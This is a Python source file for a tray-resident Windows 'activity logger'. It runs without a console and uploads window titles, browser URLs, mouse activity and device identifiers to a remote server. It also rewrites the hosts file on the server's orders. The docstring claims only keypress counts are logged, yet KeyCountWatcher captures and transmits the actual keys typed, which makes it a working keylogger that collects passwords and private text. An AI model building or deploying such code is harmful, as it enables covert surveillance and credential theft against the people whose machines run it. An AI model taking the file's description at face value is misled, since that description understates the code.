"""
activity_logger_tray.py

Activity logger that runs in the Windows system tray with no console window.
Logs device metadata, foreground window, mouse activity, and keypress counts.
Sends events to a remote server via HTTP POST with auth key validation.

Right-click the tray icon to view logging status.
"""
import argparse
import configparser
import json
import os
import platform
import queue
import socket
import sys
import threading
import time
import webbrowser
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    requests = None

try:
    import psutil
    import pywin32_system32  # noqa: F401
except Exception:
    psutil = None

try:
    import win32gui
    import win32process
    import win32con
except Exception:
    win32gui = None

try:
    from pynput import mouse, keyboard
except Exception:
    mouse = None
    keyboard = None

try:
    import pystray
    from PIL import Image, ImageDraw
except ImportError:
    pystray = None

ui = None


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def create_tray_icon():
    """Create a simple icon for the system tray"""
    # Create a simple green circle icon
    width = 64
    height = 64
    image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
    draw = ImageDraw.Draw(image)
    
    # Draw a green circle with white border
    draw.ellipse([4, 4, width-4, height-4], fill='#43e97b', outline='white', width=3)
    
    # Draw a small "A" for Activity
    draw.text((width//2-8, height//2-10), 'A', fill='white')
    
    return image


def gather_device_metadata():
    data = {
        "type": "metadata",
        "timestamp": now_iso(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "python_version": platform.python_version(),
        "cpu_count": os.cpu_count(),
        "pid": os.getpid(),
    }
    try:
        if psutil:
            data.update({
                "memory_total": psutil.virtual_memory().total,
                "disk_total": psutil.disk_usage("/").total,
                "boot_time": datetime.fromtimestamp(psutil.boot_time(), tz=timezone.utc).isoformat(),
            })
            addrs = psutil.net_if_addrs()
            macs = []
            for iface, addrs_list in addrs.items():
                for a in addrs_list:
                    if getattr(a, 'family', None) and str(getattr(a, 'address', '')).count(":") >= 1:
                        macs.append(a.address)
            data["mac_addresses"] = list(set(macs))
    except Exception:
        pass
    return data


class EventQueue:
    def __init__(self, config):
        self.queue = queue.Queue()
        self.config = config
        self.fallback_file = config.get('Logging', 'fallback_file', fallback='activity_log_fallback.jsonl')
        self.server_url = self._build_server_url()
        self.auth_key = config.get('Security', 'auth_key', fallback='')
        self.send_interval = config.getint('Logging', 'send_interval', fallback=5)
        self.retry_attempts = config.getint('Logging', 'retry_attempts', fallback=3)
        self.running = True
        self.sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self.sender_thread.start()
        self.events_sent = 0
        self.last_error = None

    def _build_server_url(self):
        host = self.config.get('Server', 'host', fallback='127.0.0.1')
        port = self.config.getint('Server', 'port', fallback=5000)
        use_ssl = self.config.getboolean('Server', 'use_ssl', fallback=False)
        scheme = 'https' if use_ssl else 'http'
        return f"{scheme}://{host}:{port}/api/events"

    def add_event(self, event):
        self.queue.put(event)

    def _sender_loop(self):
        batch = []
        while self.running:
            try:
                deadline = time.time() + self.send_interval
                while time.time() < deadline:
                    try:
                        event = self.queue.get(timeout=0.5)
                        batch.append(event)
                    except queue.Empty:
                        pass

                if batch:
                    self._send_batch(batch)
                    batch = []
            except Exception as e:
                self.last_error = str(e)

    def _send_batch(self, batch):
        if not requests:
            self._write_to_fallback(batch)
            return

        for attempt in range(self.retry_attempts):
            try:
                headers = {'Authorization': f'Bearer {self.auth_key}', 'Content-Type': 'application/json'}
                resp = requests.post(self.server_url, json={'events': batch}, headers=headers, timeout=10)
                if resp.status_code == 200:
                    self.events_sent += len(batch)
                    self.last_error = None
                    return
                else:
                    self.last_error = f"Server returned {resp.status_code}"
            except Exception as e:
                self.last_error = str(e)
                time.sleep(1)

        self._write_to_fallback(batch)

    def _write_to_fallback(self, batch):
        try:
            with open(self.fallback_file, 'a', encoding='utf-8') as f:
                for event in batch:
                    f.write(json.dumps(event, ensure_ascii=False) + "\n")
        except Exception as e:
            self.last_error = f"Fallback write error: {e}"

    def stop(self):
        self.running = False
        self.sender_thread.join(timeout=2)


class ForegroundWatcher(threading.Thread):
    def __init__(self, event_queue, poll_interval=1.0, hostname=None):
        super().__init__(daemon=True)
        self.event_queue = event_queue
        self.poll = poll_interval
        self.last = None
        self.running = True
        self.hostname = hostname or socket.gethostname()

    def get_foreground_info(self):
        if not win32gui:
            return {"title": None, "process_name": None, "pid": None}
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            proc_name = None
            try:
                proc = psutil.Process(pid)
                proc_name = proc.name()
                proc_path = proc.exe()
            except Exception:
                proc_path = None
            url = None
            try:
                global ui
                if ui is None:
                    try:
                        import uiautomation as _ui
                        ui = _ui
                    except Exception:
                        ui = None

                if ui and proc_name:
                    lower = proc_name.lower()
                    if 'chrome' in lower or 'msedge' in lower or 'brave' in lower:
                        try:
                            win = ui.WindowControl(handle=hwnd)
                        except Exception:
                            win = None
                        edit = None
                        try:
                            if win is not None:
                                edit = win.EditControl()
                        except Exception:
                            edit = None

                        if win is not None and (not edit or not edit.Exists(0, 0)):
                            for c in win.GetChildren():
                                try:
                                    if getattr(c, 'ControlTypeName', '').lower() == 'edit' or getattr(c, 'ClassName', '').lower().find('address') != -1:
                                        edit = c
                                        break
                                except Exception:
                                    continue

                        if edit and edit.Exists(0, 0):
                            try:
                                url = edit.GetValue()
                            except Exception:
                                url = None
                            if not url:
                                try:
                                    vp = edit.GetValuePattern()
                                    url = getattr(vp, 'Value', None) or (vp.GetValue() if hasattr(vp, 'GetValue') else None)
                                except Exception:
                                    url = None
                    elif 'firefox' in lower:
                        url = None
            except Exception:
                url = None

            return {"title": title, "process_name": proc_name, "pid": pid, "process_path": proc_path, "url": url}
        except Exception:
            return {"title": None, "process_name": None, "pid": None}

    def run(self):
        focus_start = None
        focus_info = None
        try:
            while self.running:
                info = self.get_foreground_info()
                key = (info.get("pid"), info.get("title"))
                now_ts = datetime.now(timezone.utc)
                if key != self.last:
                    # If we previously had focus on a window, emit screen_time for it
                    if focus_info and focus_start:
                        duration = int((now_ts - focus_start).total_seconds())
                        if duration > 0:
                                end_time = datetime.now(timezone.utc)
                                duration = int((end_time - focus_start).total_seconds())
                                if duration > 0:
                                    st_ev = {
                                        "type": "screen_time",
                                        "timestamp": end_time.isoformat(),
                                        "hostname": self.hostname,
                                        "process_name": focus_info.get("process_name"),
                                        "pid": focus_info.get("pid"),
                                        "title": focus_info.get("title"),
                                        "duration_seconds": duration,
                                    }
                                    print(f"[LOG] Emitting screen_time event: {st_ev}")
                                    self.event_queue.add_event(st_ev)

                    # Emit foreground_change for the new focus
                    ev = {
                        "type": "foreground_change",
                        "timestamp": now_iso(),
                        "hostname": self.hostname,
                        "title": info.get("title"),
                        "process_name": info.get("process_name"),
                        "pid": info.get("pid"),
                        "process_path": info.get("process_path"),
                        "url": info.get("url"),
                    }
                    self.event_queue.add_event(ev)

                    # update trackers
                    self.last = key
                    focus_start = now_ts
                    focus_info = info

                time.sleep(self.poll)
        finally:
            # On shutdown, emit screen_time for the current focus
            try:
                if focus_info and focus_start:
                    now_ts = datetime.now(timezone.utc)
                    duration = int((now_ts - focus_start).total_seconds())
                    if duration > 0:
                        # The END time (shutdown time) is now. The event timestamp must be the END time.
                        end_time = datetime.now(timezone.utc)
                        st_ev = {
                            "type": "screen_time",
                            "timestamp": end_time.isoformat(),
                            "hostname": self.hostname,
                            "process_name": focus_info.get("process_name"),
                            "pid": focus_info.get("pid"),
                            "title": focus_info.get("title"),
                            "duration_seconds": duration,
                        }
                        print(f"[LOG] Emitting screen_time event: {st_ev}")
                        self.event_queue.add_event(st_ev)
            except Exception:
                pass


class MouseIdleWatcher(threading.Thread):
    def __init__(self, event_queue, idle_seconds=60, poll_interval=1.0, hostname=None, afk_watcher=None):
        super().__init__(daemon=True)
        self.event_queue = event_queue
        self.idle_seconds = idle_seconds
        self.poll = poll_interval
        self.last_move = time.time()
        self.idle_start_time = None  # Track when idle period started
        self.is_idle = False
        self.running = True
        self.hostname = hostname or socket.gethostname()
        self.afk_watcher = afk_watcher

        if mouse:
            self.listener = mouse.Listener(on_move=self.on_move)
        else:
            self.listener = None

    def on_move(self, x, y):
        self.last_move = time.time()
        # Notify AFK watcher of activity
        if self.afk_watcher:
            self.afk_watcher.record_activity()
        
        if self.is_idle:
            # Calculate total idle duration
            total_idle_duration = time.time() - self.idle_start_time if self.idle_start_time else 0
            self.is_idle = False
            self.idle_start_time = None
            self.event_queue.add_event({
                "type": "mouse_active", 
                "timestamp": now_iso(), 
                "hostname": self.hostname, 
                "x": x, 
                "y": y,
                "idle_duration_seconds": int(total_idle_duration)
            })

    def run(self):
        if self.listener:
            self.listener.start()
        while self.running:
            idle = time.time() - self.last_move
            if idle >= self.idle_seconds and not self.is_idle:
                self.is_idle = True
                self.idle_start_time = time.time()  # Record when idle period started
                self.event_queue.add_event({"type": "mouse_idle", "timestamp": now_iso(), "hostname": self.hostname, "idle_seconds": idle})
            time.sleep(self.poll)


class AFKWatcher(threading.Thread):
    """Watches for periods of inactivity (no mouse or keyboard activity) and reports AFK segments."""
    def __init__(self, event_queue, idle_threshold=20.0, hostname=None):
        super().__init__(daemon=True)
        self.event_queue = event_queue
        self.idle_threshold = idle_threshold  # seconds before considered AFK
        self.last_activity_time = time.time()
        self.afk_start_time = None
        self.is_afk = False
        self.lock = threading.Lock()
        self.running = True
        self.hostname = hostname or socket.gethostname()

    def record_activity(self):
        """Called when mouse or keyboard activity is detected"""
        with self.lock:
            now = time.time()
            if self.is_afk:
                # Coming back from AFK
                duration = now - self.afk_start_time if self.afk_start_time else 0
                if duration > 0:
                    self.event_queue.add_event({
                        "type": "afk_end",
                        "timestamp": now_iso(),
                        "hostname": self.hostname,
                        "start_time": datetime.fromtimestamp(self.afk_start_time, tz=timezone.utc).isoformat(),
                        "end_time": datetime.fromtimestamp(now, tz=timezone.utc).isoformat(),
                        "duration_seconds": int(duration)
                    })
                self.is_afk = False
                self.afk_start_time = None
            self.last_activity_time = now

    def run(self):
        while self.running:
            time.sleep(1.0)
            with self.lock:
                now = time.time()
                idle_duration = now - self.last_activity_time
                
                if not self.is_afk and idle_duration >= self.idle_threshold:
                    # Entering AFK state
                    self.is_afk = True
                    self.afk_start_time = now
                    self.event_queue.add_event({
                        "type": "afk_start",
                        "timestamp": now_iso(),
                        "hostname": self.hostname,
                        "idle_seconds": int(idle_duration)
                    })


class KeyCountWatcher(threading.Thread):
    def __init__(self, event_queue, idle_timeout=10.0, hostname=None, afk_watcher=None):
        super().__init__(daemon=True)
        self.event_queue = event_queue
        self.idle_timeout = idle_timeout  # seconds
        self.segment_start = None  # time.time() of first key after idle
        self.last_key_time = None  # time.time() of last key
        self.count = 0
        self.keystrokes = []
        self.lock = threading.Lock()
        self.running = True
        self.hostname = hostname or socket.gethostname()
        self.afk_watcher = afk_watcher

        if keyboard:
            self.k_listener = keyboard.Listener(on_press=self.on_press)
        else:
            self.k_listener = None

    def on_press(self, key):
        now = time.time()
        # Notify AFK watcher of activity
        if self.afk_watcher:
            self.afk_watcher.record_activity()
        
        with self.lock:
            if self.segment_start is None:
                # Start new segment on first key after idle
                self.segment_start = now
                self.count = 0
                self.keystrokes = []
            self.last_key_time = now
            self.count += 1
            try:
                key_str = key.char if hasattr(key, 'char') and key.char else str(key).replace('Key.', '')
            except:
                key_str = str(key).replace('Key.', '')
            self.keystrokes.append({
                'key': key_str,
                'timestamp': now_iso()
            })
            if len(self.keystrokes) > 100:
                self.keystrokes = self.keystrokes[-100:]

    def run(self):
        if self.k_listener:
            self.k_listener.start()
        while self.running:
            time.sleep(0.5)
            with self.lock:
                now = time.time()
                # If a segment is active and we've been idle for idle_timeout, send the segment
                if self.segment_start is not None and self.last_key_time is not None:
                    idle = now - self.last_key_time
                    if idle >= self.idle_timeout:
                        duration = self.last_key_time - self.segment_start
                        if duration > 0 and self.count > 0:
                            self.event_queue.add_event({
                                "type": "key_count_segment",
                                "timestamp": now_iso(),
                                "hostname": self.hostname,
                                "count": self.count,
                                "keystrokes": self.keystrokes.copy(),
                                "start_time": datetime.fromtimestamp(self.segment_start, tz=timezone.utc).isoformat(),
                                "end_time": datetime.fromtimestamp(self.last_key_time, tz=timezone.utc).isoformat(),
                                "duration_seconds": int(duration)
                            })
                        # Reset for next segment
                        self.segment_start = None
                        self.last_key_time = None
                        self.count = 0
                        self.keystrokes = []


class BlockedSitesPoller(threading.Thread):
    """Thread that polls the server for blocked sites for this hostname and updates the hosts file."""
    START_MARKER = "# SPIEGO_BLOCK_START"
    END_MARKER = "# SPIEGO_BLOCK_END"

    def __init__(self, config, hostname=None, interval=5):
        super().__init__(daemon=True)
        self.config = config
        self.hostname = hostname or socket.gethostname()
        self.interval = interval
        self.running = True
        self.current_list = []
        self.session = requests.Session() if requests else None
        # configurable params for polling and write retries
        try:
            self.http_timeout = float(self.config.get('Logging', 'blocked_http_timeout', fallback='5'))
        except Exception:
            self.http_timeout = 5.0
        try:
            self.write_retries = int(self.config.get('Logging', 'blocked_write_retries', fallback='3'))
        except Exception:
            self.write_retries = 3
        try:
            self.write_retry_delay = float(self.config.get('Logging', 'blocked_write_retry_delay', fallback='0.5'))
        except Exception:
            self.write_retry_delay = 0.5

    def _get_server_url(self):
        host = self.config.get('Server', 'host', fallback='127.0.0.1')
        port = self.config.getint('Server', 'port', fallback=5000)
        use_ssl = self.config.getboolean('Server', 'use_ssl', fallback=False)
        scheme = 'https' if use_ssl else 'http'
        return f"{scheme}://{host}:{port}/api/blocked_sites?hostname={self.hostname}"

    def _read_hosts(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception:
            return ''

    def _write_hosts(self, path, content):
        # atomic write
        tmp = path + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(content)
        os.replace(tmp, path)

    def _apply_block_list(self, domains):
        hosts_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'hosts')
        original = self._read_hosts(hosts_path)

        # Setup logging for hosts updates
        log_path = os.path.join(os.path.dirname(__file__), 'hosts_update.log')

        def log(message):
            try:
                with open(log_path, 'a', encoding='utf-8') as lf:
                    ts = datetime.now(timezone.utc).isoformat()
                    lf.write(f"[{ts}] {message}\n")
            except Exception:
                pass

        # Normalize domains and build block section (use 127.0.0.1)
        def normalize_domain(d):
            if not d:
                return None
            d = d.strip().lower()
            # Remove protocol if present
            if d.startswith('http://'):
                d = d[7:]
            elif d.startswith('https://'):
                d = d[8:]
            # Strip path
            if '/' in d:
                d = d.split('/', 1)[0]
            # Remove trailing colon/port
            if ':' in d:
                d = d.split(':', 1)[0]
            # Do not remove leading www.; preserve subdomains as provided
            # Basic validation: must contain at least one dot
            if '.' not in d:
                return None
            return d

        lines = [self.START_MARKER]
        added = []
        for d in domains:
            nd = normalize_domain(d)
            if not nd:
                continue
            if nd in added:
                continue
            lines.append(f"127.0.0.1 {nd}")
            added.append(nd)
        lines.append(self.END_MARKER)
        block_section = '\n'.join(lines) + '\n'

        if self.START_MARKER in original and self.END_MARKER in original:
            pre, rest = original.split(self.START_MARKER, 1)
            _, post = rest.split(self.END_MARKER, 1)
            new_content = pre + block_section + post
        else:
            # append at end with a blank line
            if not original.endswith('\n'):
                original += '\n'
            new_content = original + '\n' + block_section

        # If content changed, write back
        if new_content != original:
            try:
                # Backup existing hosts file
                backup = hosts_path + '.spiego.bak'
                try:
                    with open(backup, 'w', encoding='utf-8') as b:
                        b.write(original)
                except Exception as be:
                    log(f"Backup write failed: {be}")

                # Log what we're about to write
                log(f"Applying blocked sites for {self.hostname}: {added}")

                self._write_hosts(hosts_path, new_content)
                log(f"Hosts file updated successfully")
                return True
            except Exception as e:
                # permission error or other
                log(f"Failed to update hosts file: {e}")
                return False

        return False

    def run(self):
        url = self._get_server_url()
        auth_key = self.config.get('Security', 'auth_key', fallback='')
        headers = {'Authorization': f'Bearer {auth_key}'}

        while self.running:
            try:
                if self.session:
                    resp = self.session.get(url, headers=headers, timeout=self.http_timeout)
                    if resp.status_code == 200:
                        data = resp.json()
                        domains = data.get('blocked', []) if isinstance(data, dict) else []
                    else:
                        domains = []
                else:
                    domains = []

                # If changed, apply
                if sorted(domains) != sorted(self.current_list):
                    ok = self._apply_block_list(domains)
                    if ok:
                        self.current_list = domains
                    else:
                        # immediate retry attempts (to handle transient locks)
                        for attempt in range(self.write_retries - 1):
                            time.sleep(self.write_retry_delay)
                            ok = self._apply_block_list(domains)
                            if ok:
                                self.current_list = domains
                                break
                time.sleep(self.interval)
            except Exception as e:
                # swallow and continue
                print(f"BlockedSitesPoller error: {e}")
                time.sleep(self.interval)

    def stop(self):
        self.running = False


class ActivityLoggerApp:
    def __init__(self, config_path='config.ini'):
        self.config = self.load_config(config_path)
        self.event_queue = None
        self.blocked_poller = None
        self.fg = None
        self.mi = None
        self.kc = None
        self.afk = None
        self.hostname = socket.gethostname()
        self.icon = None
        self.running = False

    def load_config(self, config_path):
        config = configparser.ConfigParser()
        if not os.path.exists(config_path):
            # Create default config if not found
            config['Server'] = {
                'host': '127.0.0.1',
                'port': '5000',
                'use_ssl': 'false'
            }
            config['Security'] = {
                'auth_key': 'your-secret-auth-key-change-me'
            }
            config['Logging'] = {
                'fallback_file': 'activity_log_fallback.jsonl',
                'send_interval': '5',
                'retry_attempts': '3',
                'idle_threshold': '60',
                'poll_interval': '1.0',
                'afk_threshold': '20',
                'blocked_poll_interval': '5',
                'blocked_http_timeout': '5',
                'blocked_write_retries': '3',
                'blocked_write_retry_delay': '0.5'
            }
            with open(config_path, 'w') as f:
                config.write(f)
        else:
            config.read(config_path)
        return config

    def start_logging(self):
        if self.running:
            return

        idle_threshold = self.config.getint('Logging', 'idle_threshold', fallback=60)
        poll_interval = self.config.getfloat('Logging', 'poll_interval', fallback=1.0)
        afk_threshold = self.config.getint('Logging', 'afk_threshold', fallback=20)

        self.event_queue = EventQueue(self.config)
        self.event_queue.add_event(gather_device_metadata())

        # Create AFK watcher first so other watchers can reference it
        self.afk = AFKWatcher(self.event_queue, idle_threshold=afk_threshold, hostname=self.hostname)

        self.fg = ForegroundWatcher(self.event_queue, poll_interval=poll_interval, hostname=self.hostname)
        self.mi = MouseIdleWatcher(self.event_queue, idle_seconds=idle_threshold, poll_interval=poll_interval, hostname=self.hostname, afk_watcher=self.afk)
        self.kc = KeyCountWatcher(self.event_queue, idle_timeout=10.0, hostname=self.hostname, afk_watcher=self.afk)

        self.afk.start()
        self.fg.start()
        self.mi.start()
        self.kc.start()
        # Start blocked sites poller
        blocked_interval = self.config.getint('Logging', 'blocked_poll_interval', fallback=5)
        self.blocked_poller = BlockedSitesPoller(self.config, hostname=self.hostname, interval=blocked_interval)
        self.blocked_poller.start()

        self.running = True

    def stop_logging(self):
        if not self.running:
            return

        if self.fg:
            self.fg.running = False
        if self.mi:
            self.mi.running = False
        if self.kc:
            self.kc.running = False
        if self.afk:
            self.afk.running = False
        if self.event_queue:
            self.event_queue.stop()
        if self.blocked_poller:
            self.blocked_poller.stop()
        
        self.running = False

    def get_status(self):
        if not self.running:
            return "Status: Stopped"
        
        status = f"Status: Running\n"
        status += f"Hostname: {self.hostname}\n"
        status += f"Server: {self.event_queue.server_url}\n"
        
        if self.event_queue:
            status += f"Events sent: {self.event_queue.events_sent}\n"
            status += f"Queue size: {self.event_queue.queue.qsize()}\n"
            if self.event_queue.last_error:
                status += f"Last error: {self.event_queue.last_error}\n"
            else:
                status += "Connection: OK\n"
        
        return status

    def open_dashboard(self):
        host = self.config.get('Server', 'host', fallback='127.0.0.1')
        port = self.config.getint('Server', 'port', fallback=5000)
        use_ssl = self.config.getboolean('Server', 'use_ssl', fallback=False)
        scheme = 'https' if use_ssl else 'http'
        url = f"{scheme}://{host}:{port}"
        webbrowser.open(url)

    def create_tray_menu(self):
        return pystray.Menu(
            pystray.MenuItem("Activity Logger", None, enabled=False),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("View Status", self.show_status)
        )

    def show_status(self):
        # Show status in a message box
        try:
            import win32api
            import win32con
            status = self.get_status()
            win32api.MessageBox(0, status, "Activity Logger Status", win32con.MB_OK | win32con.MB_ICONINFORMATION)
        except:
            pass

    def quit_app(self):
        self.stop_logging()
        if self.icon:
            self.icon.stop()

    def run(self):
        if not pystray:
            print("Error: pystray not installed. Install with: pip install pystray pillow")
            sys.exit(1)

        # Start logging
        self.start_logging()

        # Create and run system tray icon
        icon_image = create_tray_icon()
        self.icon = pystray.Icon(
            "activity_logger",
            icon_image,
            "Activity Logger",
            menu=self.create_tray_menu()
        )
        
        self.icon.run()


def main():
    parser = argparse.ArgumentParser(description="Activity Logger (System Tray)")
    parser.add_argument('--config', '-c', default='config.ini', help='Path to config file')
    args = parser.parse_args()

    app = ActivityLoggerApp(args.config)
    app.run()


if __name__ == '__main__':
    main()
